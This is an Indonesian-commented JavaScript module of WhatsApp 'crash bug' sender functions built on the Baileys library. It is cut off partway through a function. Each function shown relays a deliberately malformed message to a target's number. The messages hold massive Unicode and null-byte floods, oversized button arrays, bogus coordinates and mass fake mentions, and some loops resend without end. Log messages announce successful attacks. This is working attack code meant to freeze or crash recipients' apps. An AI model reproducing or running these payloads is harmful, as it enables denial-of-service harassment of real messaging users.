/**
 * ============================================================================
 *                    ⚡ NDIKA SENDER FUNCTIONS ENGINE ⚡
 *        Koleksi Lengkap Fungsi Sender & Bug dari Message Handler
 * ============================================================================
 * Modul ini mengekspor semua fungsi pengirim (sender functions) dari handler.js
 * agar dapat dieksekusi secara modular baik oleh WhatsApp Message Handler
 * maupun oleh REST API Dashboard dan WebSocket stream.
 */

const {
  proto,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  generateWAMessage
} = require("@whiskeysockets/baileys");
const crypto = require("crypto");
const chalk = require("chalk");

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ============================================================================
// 1. DAFTAR 27 FUNGSI SENDER DASAR
// ============================================================================
    async function sendAddressCrash(sock, targetJid) {
      const resultMsg = await generateWAMessageFromContent(targetJid, {
        viewOnceMessage: {
          message: {
            interactiveResponseMessage: {
              body: {
                text: ""
              },
              footer: {
                text: ""
              },
              buttons: [{
                type: 1,
                buttonId: "x",
                buttonText: {
                  displayText: "𑇂𑆵𑆴𑆿".repeat(100000) + "\0".repeat(100000)
                }
              }, {
                type: 1,
                buttonId: "x",
                buttonText: {
                  displayText: "\0".repeat(100000)
                }
              }, {
                type: 1,
                buttonId: "x",
                buttonText: {
                  displayText: "‍‍‍‍‍𑇂𑆵𑆴𑆿".repeat(1000000)
                }
              }, {
                type: 1,
                buttonId: "x4",
                buttonText: {
                  displayText: "\0".repeat(1000000)
                }
              }, {
                type: 1,
                buttonId: "x",
                buttonText: {
                  displayText: "𑇂𑆵𑆴𑆿".repeat(1000000)
                }
              }],
              nativeFlowResponseMessage: {
                name: "address_message",
                paramsJson: "{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"k\",\"landmark_area\":\"18\",\"address\":\"k\",\"tower_number\":\"k\",\"city\":\"k\",\"name\":\"k\",\"phone_number\":\"999999999999\",\"house_number\":\"13135550002\",\"floor_number\":\"@3135550202\",\"state\":\"X" + "\0".repeat(100000000) + "\"}}",
                version: 3
              }
            }
          }
        }
      }, {});
      await sock.relayMessage(targetJid, resultMsg.message, {
        participant: {
          jid: targetJid
        },
        messageId: resultMsg.key.id
      });
    }
    async function sendForcloseBug(sock, targetJid) {
      const options = {};
      let count = 0;
      for (let i = 0; i < 100; i++) {
        try {
          const interactivePayload = {
            interactiveMessage: {
              header: {
                title: "".repeat(50000),
                subtitle: "".repeat(50000),
                bloksWidget: {
                  uuid: "".repeat(50000),
                  data: "[".repeat(50001),
                  type: "".repeat(50000),
                  fallback: "".repeat(50000)
                }
              },
              body: {
                text: ""
              },
              nativeFlowMessage: {
                buttons: "[".repeat(50000)
              }
            }
          };
          await sock.relayMessage(targetJid, interactivePayload, options, {
            noSelfSync: true
          });
          count++;
          console.log("Successed Send Bvgs Forclose New (" + count + ")");
        } catch (err) {
          console.log("err: " + err.message);
        }
      }
    }
    async function sendLocationCrash(sock, targetJid) {
      const floodText = "‮‎‏ꦾ".repeat(25000);
      const floodText1 = "‏‮ꦽ".repeat(6000);
      console.log("proses send bug");
      for (let i = 0; i < 5; i++) {
        let buttons = [];
        for (let j = 0; j < 20; j++) {
          const buttonItem = {
            display_text: floodText1
          };
          const buttonItem1 = {
            display_text: floodText1
          };
          buttons.push({
            name: "cta_call",
            buttonParamsJson: JSON.stringify(buttonItem)
          }, {
            name: "galaxy_message",
            buttonParamsJson: JSON.stringify(buttonItem1)
          });
        }
        const locationPayload = {
          title: floodText,
          hasMediaAttachment: true,
          locationMessage: {}
        };
        locationPayload.locationMessage.degreesLatitude = 99999999;
        locationPayload.locationMessage.degreesLongitude = -99999999;
        locationPayload.locationMessage.name = floodText;
        locationPayload.locationMessage.address = floodText;
        const msgPayload = {
          text: floodText
        };
        const msgPayload1 = {
          text: floodText
        };
        let viewOncePayload = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: locationPayload,
                body: msgPayload,
                footer: msgPayload1,
                nativeFlowMessage: {
                  buttons: buttons,
                  messageParamsJson: "{}".repeat(1000)
                },
                contextInfo: {
                  mentionedJid: [targetJid],
                  forwardingScore: 1,
                  isForwarded: false,
                  externalAdReply: {
                    title: floodText,
                    body: floodText,
                    mediaType: 2,
                    thumbnail: Buffer.alloc(0),
                    renderLargerThumbnail: true,
                    sourceUrl: " "
                  }
                }
              }
            }
          }
        };
        await sock.relayMessage(targetJid, viewOncePayload, {
          messageId: "NZ-" + crypto.randomBytes(8).toString("hex").toUpperCase(),
          participant: {
            jid: targetJid
          }
        }).catch(targetJid1 => {});
        console.log("succes send bug");
        await new Promise(targetJid1 => setTimeout(targetJid1, 200));
      }
    }
    async function sendButtonBug(sock, targetJid) {
      for (let i = 0; i < 40; i++) {
        await sock.relayMessage(targetJid, {
          interactiveMessage: {
            body: {
              text: "Know Ndika¿?"
            },
            nativeFlowMessage: {
              buttons: Array.from({
                length: 300000
              }, () => ({})),
              messageParams: new Array(300000).fill(null)
            }
          }
        }, {});
        await sock.relayMessage(targetJid, {
          extendedTextMessage: {
            text: "Know Ndika¿?",
            contextInfo: {
              mentionedJid: [targetJid]
            }
          }
        }, {});
      }
    }
    async function sendGroupStatusBug(sock, targetJid) {
      const textPayload = "‌‍​\u200A\00個";
      const count = 1000000;
      const statusMsg = {
        groupStatusMessageV2: {
          message: {
            interactiveMessage: {
              body: {
                text: "Know Ndika¿?",
                display_text: "‌"
              },
              nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({
                  icon: "document",
                  title: "Monkey?!",
                  sections: Array.from({
                    length: 505555
                  }, () => ({}))
                })
              },
              nativeFlowMessage: {
                buttons: Array.from({
                  length: 500000
                }, () => ({}))
              }
            }
          }
        }
      };
      await sock.relayMessage(targetJid, statusMsg, {});
    }
    async function sendLegacyCrash(sock, targetJid) {
      const data = "𑜦𑜠".repeat(1000) + "ꦾ".repeat(1000);
      try {
        const locationPayload = {
          title: data,
          hasMediaAttachment: false,
          locationMessage: {}
        };
        locationPayload.locationMessage.degreesLatitude = -6666666666;
        locationPayload.locationMessage.degreesLongitude = 6666666666;
        locationPayload.locationMessage.name = data;
        locationPayload.locationMessage.address = "\0";
        const viewOncePayload = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: locationPayload,
                body: {
                  text: "Ndika Attack🍁" + data
                },
                nativeFlowResponseMessage: {
                  name: "payment_transaction_details",
                  paramsJson: "ࢠ".repeat(10000),
                  version: 3
                },
                contextInfo: {
                  participant: targetJid,
                  mentionedJid: ["0@s.whatsapp.net", ...Array.from({
                    length: 1900
                  }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")]
                }
              }
            }
          }
        };
        await sock.relayMessage(targetJid, viewOncePayload, {
          messageId: null,
          participant: {
            jid: targetJid
          },
          userJid: targetJid
        });
        console.log("Ndika Success Attack!✅");
      } catch (err) {
        console.log("❌ error:\n" + err);
      }
    }
    async function sendGalaxyCrash(sock, targetJid) {
      const resultData = sock.generateMessageTag();
      const msgPayload = {
        interactiveResponseMessage: {
          body: {
            text: "night",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "{\"flow_cta\":\"" + "\0".repeat(900000) + "\"}",
            version: 3
          }
        }
      };
      const msgPayload1 = {
        messageId: resultData
      };
      await sock.relayMessage(targetJid, msgPayload, msgPayload1);
    }
    async function sendDelayHardBug(sock, targetJid) {
      while (true) {
        try {
          const statusMsg = {
            groupStatusMessageV2: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "bokep",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: "cta_VnX",
                    paramsJson: "{\"flow_cta\":\"" + "\0".repeat(900000) + "\"}}",
                    version: 3
                  }
                }
              }
            }
          };
          await sock.relayMessage(targetJid, statusMsg, {
            participant: {
              jid: targetJid
            }
          });
          console.log("Ndika Delay Hard successfully spammed to " + targetJid);
          await new Promise(targetJid1 => setTimeout(targetJid1, 1500));
        } catch (err) {
          console.log("❌ Error Strike:", err);
          await new Promise(targetJid1 => setTimeout(targetJid1, 5000));
        }
      }
    }
    async function sendStatusMentionCrash(sock, targetJid) {
      let textPayload = "";
      for (let i = 0; i < 500; i++) {
        textPayload = "\0".repeat(100000);
      }
      let textPayload1 = "[ ! ] Ndika Xploit 𖥂";
      let floodText = "​".repeat(15000);
      const msgPayload = {
        businessOwnerJid: targetJid
      };
      const viewOncePayload = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 3.2,
              isStatusBroadcast: true,
              statusBroadcastJid: "status@broadcast",
              messageSecret: crypto.randomBytes(32),
              supportPayload: JSON.stringify({
                version: 2,
                is_ai_message: true,
                should_show_system_message: true,
                ticket_id: crypto.randomBytes(16)
              }),
              badgeChat: {
                unreadCount: 9999
              }
            },
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/624912752_1596049687978403_6451067671494406178_n.enc?ccb=11-4&oh=01_Q5Aa3gFYO0G29IPNcCnG8ohcWvLjfMtF6J4iRyKTC-edxR93jQ&oe=69A619FB&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "i9f20ml17evedyS4QNnyWx88c3l47PgSLfnatSGtyQ8=",
              fileLength: "108310",
              height: 1024,
              width: 1024,
              mediaKey: "1sXEfozwkMaHPErmCEPOJgUPyljYnE/dF4UFt/F8puE=",
              fileEncSha256: "l5MwkOSc5LdITAEPwjZrPk65DzjeHpZkJecYGTx3If4=",
              directPath: "/v/t62.7118-24/624912752_1596049687978403_6451067671494406178_n.enc?ccb=11-4&oh=01_Q5Aa3gFYO0G29IPNcCnG8ohcWvLjfMtF6J4iRyKTC-edxR93jQ&oe=69A619FB&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1769910124",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAADBAUGAAIBAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADSRaOfLDefqgvDfsTrxqZGPBdJ2px5zUdnyqYsV5PhqMkQVJ6KAX5CldF5NbmNcgY4zXZ6fZ1mMdw3bj//xAAoEAACAgIBAwQCAgMAAAAAAAABAgADBBEhEhMxBSIyQBFRFGFCUmL/2gAIAQEAAT8AnqTpTkY92xMbMryS3bQ6H3CSASSDoT232gqPaCeI4yq06g5OpgZNtnNrfi3KSqoWEE7+hPUzfkoLP45VRPRb9CyqZRbt635MqIBC651uEhupZUAO6n+rbEW0CvbeRKM0VcWEHmX+p4ZrI3MTINCSLPrcNqZNBdfjMasM3WLif2Jk1kOr90hR9CJkayD/cuyHfQHmLj1sCSSSImFRcmvi37jp27HTe9GUX3ojhT7P8o2U6Vp2uCZXfe6m65+AvAndZ7OonX9QMT7oeqtiTwDLcimumspv7hJ2GNHeHI+51HkA+ZiFalYuvV7YxawWHWvHH6Eoxmut4adLU2dBO9S/E+Xt4j0Aq6sOQNiJa9XUv0fImKgsuUS+pVpscDWlleQVs2eQRozHzFxA6geTsSzJW8l+Q0ybHqqZ1TqI+pZmu7k9sLuPUSSeoSgGi1XQgkS7MtvrNelG/lDR/wBCNQBbLiVUHs6jj+9PzO05YrPUcWrG0EkwsTv1Mx8iW+mqlD2AnYEdXLhBydTqIbmVLZa3VP/EABcRAQEBAQAAAAAAAAAAAAAAAAAiATD/2gAIAQIBAT8A60pj/8QAHBEAAgICAwAAAAAAAAAAAAAAAAECEQNBMDJS/9oACAEDAQE/AOJDdsVbE8XkvFXVknHSP//z",
              caption: textPayload1 + floodText,
              contextInfo: {
                isForwarding: true,
                isGroupMention: true,
                forwardingScore: 9999999,
                remoteJid: "status@broadcast",
                mentionedJid: Array.from({
                  length: 1901
                }, () => "1" + Math.floor(Math.random() * 9000000000000) + "@s.whatsapp.net"),
                groupMentions: [],
                entryPointConversionSource: "non_contact",
                entryPointConversionApp: "whatsapp",
                entryPointConversionDelaySeconds: 467593,
                stanzaId: "666-666666-Ndika-Id" + Math.floor(Math.random() * 99999),
                disappearingMode: {
                  initiator: "CHANGED_IN_CHAT",
                  trigger: "CHAT_SETTING"
                },
                businessMessageForwardInfo: msgPayload,
                dataSharingContext: {
                  showMmDisclosure: true
                },
                placeholderKey: {
                  remoteJid: "18002428478@s.whatsapp.net",
                  fromMe: false,
                  id: floodText,
                  pushName: floodText,
                  verifiedName: floodText
                },
                quotedMessage: {
                  viewOnceMessage: {
                    message: {
                      interactiveResponseMessage: {
                        body: {
                          text: " [ ! ] Ndika Xploit 𖥂",
                          format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                          name: "call_permission_request",
                          paramsJson: floodText,
                          version: 3
                        },
                        entryPointConversionSource: "🧸"
                      }
                    }
                  }
                },
                pairedMediaType: "NOT_PAIRED_MEDIA",
                statusSourceType: "IMAGE"
              },
              scansSidecar: "tn5cCN82YiZ/WQGjd1GJTAgw6MoJWz4Q+rq9TOipMvCakSOHK/lnVQ==",
              scanLengths: [12567, 43151, 21308, 31284],
              midQualityFileSha256: "s6BsP5qaznFeBkYyf5jfuLOpc60SQ/03e7G+NDU/uSQ="
            },
            nativeFlowMessage: {
              messageParamsJson: floodText
            }
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: textPayload
          }
        }
      };
      const msgPayload1 = {
        tag: "status",
        attrs: {
          id: sock.generateMessageTag(),
          from: sock.user.id
        },
        content: [{
          tag: "mentioned_users",
          attrs: {
            type: "͢".repeat(511)
          },
          content: "🔥"
        }]
      };
      await sock.sendNode(msgPayload1);
      await sock.relayMessage("status@broadcast", viewOncePayload, {
        statusJidList: [targetJid],
        additionalNodes: [{
          tag: "meta",
          attrs: {},
          content: [{
            tag: "mentioned_users",
            attrs: {},
            content: [{
              tag: "to",
              attrs: {
                jid: targetJid
              }
            }]
          }]
        }]
      });
      if (targetJid) {
        const msgPayload2 = {
          key: viewOncePayload.key,
          type: 25
        };
        const msgPayload3 = {
          protocolMessage: msgPayload2
        };
        const msgPayload4 = {
          message: msgPayload3
        };
        const msgPayload5 = {
          groupStatusMentionMessage: msgPayload4
        };
        const msgPayload6 = {
          tag: "meta",
          attrs: {},
          content: undefined
        };
        msgPayload6.attrs.is_status_mention = "Crashed";
        const msgPayload7 = {
          additionalNodes: [msgPayload6]
        };
        await sock.relayMessage(targetJid, msgPayload5, msgPayload7);
      }
      ;
      console.log(chalk.red("Succesfully Attack Target By : t.me/NdikaOfficial"));
    }
    async function sendStatusMentionProtocol(sock, targetJid) {
      const count = 100;
      console.log("proses send bug");
      for (let i = 0; i < count; i++) {
        const floodText = "‎‏‮‭".repeat(45000);
        const msgPayload = {
          title: floodText,
          hasMediaAttachment: true,
          productMessage: {}
        };
        msgPayload.productMessage.product = {};
        msgPayload.productMessage.businessOwnerJid = targetJid;
        msgPayload.productMessage.product.productImage = {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/31444557_1338604753594000_2715093556515569429_n.enc"
        };
        msgPayload.productMessage.product.productId = "99999999";
        msgPayload.productMessage.product.title = floodText;
        msgPayload.productMessage.product.description = floodText;
        msgPayload.productMessage.product.currencyCode = "IDR";
        msgPayload.productMessage.product.priceAmount1000 = "999999999999";
        msgPayload.productMessage.product.retailerId = floodText;
        msgPayload.productMessage.product.productImageCount = 999;
        const msgPayload1 = {
          text: floodText
        };
        const msgPayload2 = {
          text: floodText
        };
        let viewOncePayload = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: msgPayload,
                body: msgPayload1,
                footer: msgPayload2,
                nativeFlowMessage: {
                  buttons: [{
                    name: "single_select",
                    buttonParamsJson: JSON.stringify({
                      title: " ",
                      sections: [{
                        title: floodText,
                        rows: Array(10).fill({
                          title: " ",
                          rowId: "fc_id"
                        })
                      }]
                    })
                  }],
                  messageVersion: 4
                },
                contextInfo: {
                  mentionedJid: [targetJid],
                  forwardingScore: 2147483647,
                  isForwarded: true,
                  externalAdReply: {
                    title: floodText,
                    body: floodText,
                    mediaType: 2,
                    thumbnail: Buffer.alloc(0),
                    renderLargerThumbnail: true,
                    sourceUrl: " "
                  }
                }
              }
            }
          }
        };
        await sock.relayMessage(targetJid, viewOncePayload, {
          messageId: "NZ-ANDRO-" + crypto.randomBytes(8).toString("hex").toUpperCase(),
          participant: {
            jid: targetJid
          }
        }).catch(() => {});
        console.log("succes send bug");
        if (i % 5 === 0) {
          await new Promise(targetJid1 => setTimeout(targetJid1, 200));
        }
      }
      console.log("proses send bug selesai");
    }
    async function sendCallPermissionBug(sock, targetJid) {
      console.log(chalk.red("Succesfully Attack Target By : t.me/NdikaOfficial"));
      let buttons = [];
      let floodText = "ꦾ".repeat(90000);
      for (let i = 0; i < 10; i++) {
        buttons.push({
          body: proto.Message.InteractiveMessage.Body.fromObject({
            text: "ㅤ"
          }),
          footer: proto.Message.InteractiveMessage.Footer.fromObject({
            text: "ㅤㅤ"
          }),
          header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "𝘿𝙖𝙫𝙖𝙓 𝙒𝙖𝙨 𝙃𝙚𝙧𝙚 〽️" + "\0".repeat(60000),
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/624912752_1596049687978403_6451067671494406178_n.enc?ccb=11-4&oh=01_Q5Aa3gFYO0G29IPNcCnG8ohcWvLjfMtF6J4iRyKTC-edxR93jQ&oe=69A619FB&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "i9f20ml17evedyS4QNnyWx88c3l47PgSLfnatSGtyQ8=",
              fileLength: "108310",
              height: 1024,
              width: 1024,
              mediaKey: "1sXEfozwkMaHPErmCEPOJgUPyljYnE/dF4UFt/F8puE=",
              fileEncSha256: "l5MwkOSc5LdITAEPwjZrPk65DzjeHpZkJecYGTx3If4=",
              directPath: "/v/t62.7118-24/624912752_1596049687978403_6451067671494406178_n.enc?ccb=11-4&oh=01_Q5Aa3gFYO0G29IPNcCnG8ohcWvLjfMtF6J4iRyKTC-edxR93jQ&oe=69A619FB&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1769910124",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEAAQAMBIgACEQEDEQH/xAAvAAADAQEBAQAAAAAAAAAAAAADBAUGAAIBAQEBAQEAAAAAAAAAAAAAAAAAAQID/9oADAMBAAIQAxAAAADSRaOfLDefqgvDfsTrxqZGPBdJ2px5zUdnyqYsV5PhqMkQVJ6KAX5CldF5NbmNcgY4zXZ6fZ1mMdw3bj//xAAoEAACAgIBAwQCAgMAAAAAAAABAgADBBEhEhMxBSIyQBFRFGFCUmL/2gAIAQEAAT8AnqTpTkY92xMbMryS3bQ6H3CSASSDoT232gqPaCeI4yq06g5OpgZNtnNrfi3KSqoWEE7+hPUzfkoLP45VRPRb9CyqZRbt635MqIBC651uEhupZUAO6n+rbEW0CvbeRKM0VcWEHmX+p4ZrI3MTINCSLPrcNqZNBdfjMasM3WLif2Jk1kOr90hR9CJkayD/cuyHfQHmLj1sCSSSImFRcmvi37jp27HTe9GUX3ojhT7P8o2U6Vp2uCZXfe6m65+AvAndZ7OonX9QMT7oeqtiTwDLcimumspv7hJ2GNHeHI+51HkA+ZiFalYuvV7YxawWHWvHH6Eoxmut4adLU2dBO9S/E+Xt4j0Aq6sOQNiJa9XUv0fImKgsuUS+pVpscDWlleQVs2eQRozHzFxA6geTsSzJW8l+Q0ybHqqZ1TqI+pZmu7k9sLuPUSSeoSgGi1XQgkS7MtvrNelG/lDR/wBCNQBbLiVUHs6jj+9PzO05YrPUcWrG0EkwsTv1Mx8iW+mqlD2AnYEdXLhBydTqIbmVLZa3VP/EABcRAQEBAQAAAAAAAAAAAAAAAAAiATD/2gAIAQIBAT8A60pj/8QAHBEAAgICAwAAAAAAAAAAAAAAAAECEQNBMDJS/9oACAEDAQE/AOJDdsVbE8XkvFXVknHSP//Z",
              contextInfo: {
                disappearingMode: {
                  initiator: "INITIATED_BY_OTHER",
                  trigger: "ACCOUNT_SETTING"
                },
                dataSharingContext: {
                  showMmDisclosure: true
                },
                pairedMediaType: "NOT_PAIRED_MEDIA",
                statusSourceType: "IMAGE",
                expiration: 9741,
                ephemeralSettingTimestamp: 9741,
                entryPointConversionSource: "WhatsApp.com",
                entryPointConversionApp: "WhatsApp",
                entryPointConversionDelaySeconds: 9742
              },
              scansSidecar: "tn5cCN82YiZ/WQGjd1GJTAgw6MoJWz4Q+rq9TOipMvCakSOHK/lnVQ==",
              scanLengths: [12567, 43151, 21308, 31284],
              midQualityFileSha256: "s6BsP5qaznFeBkYyf5jfuLOpc60SQ/03e7G+NDU/uSQ="
            }
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            messageParamsJson: JSON.stringify({
              limited_time_offer: {
                text: "꦳".repeat(500),
                url: "t.me/NdikaOfficial",
                copy_code: "🔥 Foooooo",
                expiration_time: Date.now() * 999
              }
            })
          })
        });
      }
      const msgPayload = {
        cards: [...buttons]
      };
      const viewOncePayload = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              messageSecret: crypto.randomBytes(32),
              supportPayload: JSON.stringify({
                version: 2,
                is_ai_message: true,
                should_show_system_message: true,
                ticket_id: crypto.randomBytes(16)
              }),
              badgeChat: {
                unreadCount: 9999
              }
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.create({
                text: "[ ! ] Ndika Xploit 𖥂" + floodText
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: "> https://t.me/NdikaOfficial"
              }),
              header: proto.Message.InteractiveMessage.Header.create({
                hasMediaAttachment: false
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject(msgPayload),
              contextInfo: {
                mentionedJid: Array.from({
                  length: 1901
                }, () => "1" + Math.floor(Math.random() * 9000000000000) + "@s.whatsapp.net"),
                groupMentions: [],
                entryPointConversionSource: "non_contact",
                entryPointConversionApp: "whatsapp",
                entryPointConversionDelaySeconds: 467593,
                participant: "0@s.whatsapp.net",
                quotedMessage: {
                  viewOnceMessage: {
                    message: {
                      interactiveResponseMessage: {
                        body: {
                          text: "[ ! ] Ndika Xploit 𖥂",
                          format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                          name: "call_permission_request",
                          paramsJson: "\0".repeat(500),
                          version: 3
                        }
                      }
                    }
                  }
                },
                remoteJid: "@s.whatsapp.net"
              }
            })
          }
        }
      };
      await sock.relayMessage(targetJid, viewOncePayload, {
        participant: {
          jid: targetJid
        },
        messageId: sock.generateMessageTag()
      });
    }
    async function sendInvoicePaymentBug(sock, targetJid) {
      try {
        await sock.relayMessage(targetJid, {
          viewOnceMessage: {
            message: {
              templateButtonReplyMessage: {
                amount: "CORRUPT",
                selectedIndex: null,
                contextInfo: {
                  stanzaId: null,
                  participant: targetJid,
                  paymentInviteMessage: null,
                  quotedMessage: {
                    contactMessage: {
                      displayName: "hamzIshere" + "ြ".repeat(25000),
                      vcard: "BEGIN:VCARD\nVERSION:3.0\nN:;🦠⃰‌°‌‌VnX ⿻ Are You Okay? ✶ > 666" + "ြ".repeat(25000) + "\nEND:VCARD",
                      renderLargerThumbnail: true
                    },
                    contextInfo: {
                      isForwarded: true,
                      forwardingScore: 999
                    }
                  }
                }
              }
            }
          }
        }, {
          participant: {
            jid: targetJid
          }
        });
        const waMessage = generateWAMessageFromContent(targetJid, {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "zyzyyIshere",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "{\"flow_cta\":\"" + "\0".repeat(900000) + "\"}}",
                  version: 3
                }
              }
            }
          }
        }, {
          ephemeralExpiration: 0,
          forwardingScore: 9741,
          isForwarded: true,
          font: Math.floor(Math.random() * 99999999),
          background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
        });
        const msgPayload = {
          message: waMessage.message
        };
        const statusMsg = {
          groupStatusMessageV2: msgPayload
        };
        await sock.relayMessage(targetJid, statusMsg, {
          messageId: waMessage.key.id,
          participant: {
            jid: targetJid
          }
        });
      } catch (err) {
        console.error("error:", err);
      }
    }
    async function sendProtocolRepeatBug(sock, targetJid) {
      console.log(chalk.red("Succesfully Attack Target By : @DapaXploitt"));
      sock.relayMessage(targetJid, {
        extendedTextMessage: {
          text: "[ ! ] Ndika Xploit 𖥂" + "ꦽꦂ".repeat(90000),
          contextInfo: {
            mentionedJid: Array.from({
              length: 1900
            }, () => "1" + Math.floor(Math.random() * 9000000000000) + "@s.whatsapp.net"),
            externalAdReply: {
              title: "🎭 𝐓𝐫𝐚𝐯𝐚𝐬 𝐔𝐢 🔥",
              body: "",
              previewType: "PHOTO",
              thumbnail: "",
              sourceUrl: telegramLink
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            }
          },
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }, {
        participant: {
          jid: targetJid,
          quoted: null
        }
      }, {
        messageId: null
      });
    }
    async function sendCrashClickBug(sock, targetJid) {
      try {
        const viewOncePayload = {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "ោ៝".repeat(63000),
                  hasMediaAttachment: false
                },
                body: {
                  text: "ꦽ".repeat(1024)
                },
                contextInfo: {
                  forwardingScore: 9999,
                  isForwarded: true,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast"
                },
                nativeFlowMessage: {
                  buttons: [{
                    name: "cta_call",
                    buttonParamsJson: ""
                  }, {
                    name: "call_permission_request",
                    buttonParamsJson: JSON.stringify({
                      status: true
                    })
                  }],
                  messageParamsJson: "{}"
                }
              }
            }
          }
        };
        await sock.relayMessage(targetJid, viewOncePayload, {});
      } catch (err) {
        console.error(err);
      }
    }
    async function sendGroupCrash(sock, targetJid) {
      if (!targetJid.endsWith("@g.us")) {
        throw new Error("@g.us server required");
      }
      let data = targetJid;
      try {
        await sock.groupParticipantsUpdate(data, ["18188880008@s.whatsapp.net"], "add");
        await sock.sendPresenceUpdate("composing", data);
      } catch (err) {
        console.error("error:", err);
        throw err;
      }
    }
    async function sendLocationCrash2(sock, targetJid) {
      await sock.relayMessage(targetJid, {
        stickerPackMessage: {
          stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
          name: "kontol⃝҉⃝" + "ꦾ".repeat(40000),
          publisher: "ꦽ".repeat(20000),
          stickers: [],
          fileLength: 12260,
          fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
          fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
          mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
          directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
          height: 9999,
          width: 9999,
          mediaKeyTimestamp: "1747502082",
          isAnimated: false,
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
          emojis: ["😹", "😹", "😂", "😂"],
          contextInfo: {
            mentionedJid: ["131338822@s.whatsapp.net", ...Array.from({
              length: 1900
            }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")],
            remoteJid: "X",
            participant: targetJid,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          },
          packDescription: "",
          trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
          thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
          thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
          thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
          thumbnailHeight: 252,
          thumbnailWidth: 252,
          imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
          stickerPackSize: "3680054",
          stickerPackOrigin: "USER_CREATED"
        }
      }, {
        participant: {
          jid: targetJid
        }
      });
    }
    async function sendViewOnceBug(sock, targetJid) {
      const {
        encodeSignedDeviceIdentity: resultData,
        jidEncode: resultData1,
        jidDecode: resultData2,
        encodeWAMessage: resultData3,
